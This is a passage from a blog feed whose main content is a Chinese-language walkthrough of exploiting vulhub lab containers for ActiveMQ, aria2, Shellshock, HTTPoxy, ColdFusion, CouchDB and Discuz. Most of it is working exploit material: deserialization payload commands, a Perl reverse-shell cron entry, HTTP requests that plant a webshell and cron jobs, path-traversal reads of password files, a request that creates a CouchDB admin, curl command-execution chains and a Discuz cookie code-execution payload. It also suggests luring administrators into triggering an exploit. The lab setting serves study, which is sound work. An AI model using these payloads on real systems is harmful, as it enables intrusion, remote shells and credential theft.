&lt;p&gt;burpsuite可以说是渗透测试中的神兵利器，我当初入坑的第一节就是学的burpsuite，在渗透测试中可以说是必不可少的一部分，这里会从各个模块来介绍burpsuite的几大功能。有什么错误也希望走过路过的大佬们指出，由于是说基本用法所以比较基础，各种大佬大神可以绕过啦哈哈。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://black0saturday.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>vulhub挖洞心得</title>
    <link href="http://black0saturday.github.io/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/"/>
    <id>http://black0saturday.github.io/2018/07/11/vulhub挖洞心得/</id>
    <published>2018-07-11T01:29:15.000Z</published>
    <updated>2020-04-01T09:06:06.760Z</updated>
    
    <content type="html"><![CDATA[<p>最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞</p><h2 id="Docker的安装和使用"><a href="#Docker的安装和使用" class="headerlink" title="Docker的安装和使用"></a>Docker的安装和使用</h2><p> 先推荐一个讲的比较详细的网站：<a href="https://blog.csdn.net/zxcxq/article/details/77261716" target="_blank" rel="noopener">https://blog.csdn.net/zxcxq/article/details/77261716</a></p><a id="more"></a><h3 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h3><pre><code>apt-get update &amp;&amp; apt-get install docker.io</code></pre><h3 id="2-启动docker服务"><a href="#2-启动docker服务" class="headerlink" title="2.启动docker服务"></a>2.启动docker服务</h3><pre><code>service docker start</code></pre><h3 id="3-安装compose"><a href="#3-安装compose" class="headerlink" title="3.安装compose"></a>3.安装compose</h3><pre><code>pip install docker-compose</code></pre><p>安装好之后可以下载vulhub<br><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">https://github.com/phith0n/vulhub</a><br>还有一个vulapp<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><h3 id="4-在线自动化编译docker环境"><a href="#4-在线自动化编译docker环境" class="headerlink" title="4.在线自动化编译docker环境"></a>4.在线自动化编译docker环境</h3><p> 进入vulhub目录，随便选择一个环境，这里以第一个activemq为例，进入该目录后，输入命令<code>docker-compose build</code><br> 如果报错有可能是服务没开，也有可能是作者已经编译好了，那就直接执行下一步</p><h3 id="5-开启docker里的容器"><a href="#5-开启docker里的容器" class="headerlink" title="5.开启docker里的容器"></a>5.开启docker里的容器</h3><p> <code>docker-compose up -d</code><br>然后就可以看到环境已经搭建好了</p><p>每个环境里面都有一个README.MD  里面有详细的说明漏洞环境如何搭建，如何启动，如何使用漏洞，所以一定要看一下这个文件</p><h2 id="挖洞过程"><a href="#挖洞过程" class="headerlink" title="挖洞过程"></a>挖洞过程</h2><h3 id="1-activemq"><a href="#1-activemq" class="headerlink" title="1.activemq"></a>1.activemq</h3><h4 id="1-CVE-2015-5254"><a href="#1-CVE-2015-5254" class="headerlink" title="(1) CVE-2015-5254"></a>(1) CVE-2015-5254</h4><p>ActiveMQ 反序列化漏洞（CVE-2015-5254）</p><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。</p><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/1.png" alt></p><p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/2.png" alt></p><p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker-compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/3.png" alt></p><p>将命令替换成弹shell语句再利用：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/4.png" alt></p><p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p><h4 id="2-CVE-2016-3088"><a href="#2-CVE-2016-3088" class="headerlink" title="(2)CVE-2016-3088"></a>(2)CVE-2016-3088</h4><p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。<br>访问<code>http://192.168.6.130:8161/</code>看到web页面，说明环境已成功运行。</p><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><p>写入crontab，自动化弹shell</p><p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;192.168.6.130&quot;;$p&#x3D;8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">##</span><br></pre></td></tr></table></figure><p>将其移动到<code>/etc/cron.d/root</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>如果上述两个请求都返回204了，说明写入成功。等待反弹shell：</p><p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://192.168.6.130:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p><p>然后上传webshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>访问webshell（需要登录）,或者直接上菜刀</p><h3 id="2-aria2"><a href="#2-aria2" class="headerlink" title="2.aria2"></a>2.aria2</h3><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a> 。</p><p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code>:<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/5.png" alt></p><p>然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/6.png" alt></p><p>这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/7.png" alt></p><blockquote><p>如果反弹不成功，注意crontab文件的格式，以及换行符必须是<code>\n</code>，且文件结尾需要有一个换行符。</p></blockquote><p>当然，我们也可以尝试写入其他文件</p><h3 id="3-shellshock"><a href="#3-shellshock" class="headerlink" title="3.shellshock"></a>3.shellshock</h3><p>Shellshock 破壳漏洞（CVE-2014-6271）<br>访问<code>http://192.168.6.130/</code>，有两个文件：</p><ul><li>safe.cgi</li><li>victim.cgi</li></ul><p>其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>带上payload访问victim.cgi，命令成功被执行：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/8.png" alt></p><p>同样的数据包访问safe.cgi，不受影响：<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/9.png" alt></p><h3 id="3-cgi"><a href="#3-cgi" class="headerlink" title="3.cgi"></a>3.cgi</h3><p>HTTPoxy漏洞（CVE-2016-5385）</p><p>参考：<a href="原理">http://www.laruence.com/2016/07/19/3101.html</a></p><p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。</p><p>正常请求<code>http://your-ip/index.php</code>，可见其Origin为当前请求的服务器，二者IP相等：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/10.png" alt></p><p>在其他地方找到一个可以正常运行的http代理，如<code>http://x.x.122.65:8888/</code>。</p><p>附带<code>Proxy: http://x.x.122.65:8888/</code>头，再次访问<code>http://your-ip/index.php</code>：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/11.png" alt></p><p>如上图，可见此时的Origin已经变成<code>x.x.122.65</code>，也就是说真正进行HTTP访问的服务器是<code>x.x.122.65</code>，也就是说<code>x.x.122.65</code>已经将正常的HTTP请求代理了。</p><p>在<code>x.x.122.65</code>上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/12.png" alt></p><h3 id="4-coldfusion"><a href="#4-coldfusion" class="headerlink" title="4.coldfusion"></a>4.coldfusion</h3><h4 id="1-Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#1-Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="(1)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>(1)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h4><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p><p>直接访问<code>http://192.168.6.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code><br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/13.png" alt><br>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/14.png" alt></p><h4 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h4><p>参考链接：</p><ul><li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li></ul><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">ColdFusionPwn</a>工具来生成POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/15.png" alt></p><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/16.png" alt></p><p>将POC改成<br><a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">反弹命令</a>，<br>成功拿到shell：<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/17.png" alt></p><h3 id="5-couchdb"><a href="#5-couchdb" class="headerlink" title="5.couchdb"></a>5.couchdb</h3><h4 id="1-Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#1-Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="(1)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>(1)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h4><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul><p>首先，发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，返回403错误：<code>{&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;}</code>，只有管理员才能设置Role角色：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/18.png" alt></p><p>发送包含两个roles的数据包，即可绕过限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功创建管理员，账户密码均为<code>vulhub</code>：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/19.png" alt></p><p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/20.png" alt></p><h4 id="（2）Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#（2）Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）</h4><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635" target="_blank" rel="noopener">CVE-2017-12635</a>先增加一个管理员用户。</p><p>依次执行如下请求即可触发任意命令执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p>利用脚本</p><p>写了一个简单的脚本 <a href="exp.py">exp.py</a>，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本，成功反弹shell：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/21.png" alt></p><h3 id="6-discuz"><a href="#6-discuz" class="headerlink" title="6.discuz"></a>6.discuz</h3><h4 id="1-Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#1-Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="(1)Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>(1)Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h4><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p><ul><li><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></li></ul><p>安装成功后，直接找一个已存在的帖子，向其发送数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;viewthread.php?tid&#x3D;10&amp;extra&#x3D;page%3D1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui; GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><br>可见，phpinfo已成功执行：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/22.png" alt><br>同样，也可以换成system()函数，这样就可以在括号里执行一些命令</p><h4 id="（2）Discuz-X-≤3-4-任意文件删除漏洞"><a href="#（2）Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="（2）Discuz!X ≤3.4 任意文件删除漏洞"></a>（2）Discuz!X ≤3.4 任意文件删除漏洞</h4><p>漏洞详情：<a href="https://lorexxar.cn/2017/09/30/dz-delete/" target="_blank" rel="noopener">https://lorexxar.cn/2017/09/30/dz-delete/</a></p><p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：<br><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/23.png" alt></p><p>注册用户后，在个人设置页面找到自己的formhash：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/24.png" alt></p><p>带上自己的Cookie、formhash发送如下数据包：</p><pre><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1Host: localhostContent-Length: 367Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12sUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: [your cookie]Connection: close------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name=&quot;formhash&quot;[your formhash]------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name=&quot;birthprovince&quot;../../../robots.txt------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name=&quot;profilesubmit&quot;1------WebKitFormBoundaryPFvXyxL45f34L12s--</code></pre><p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/25.png" 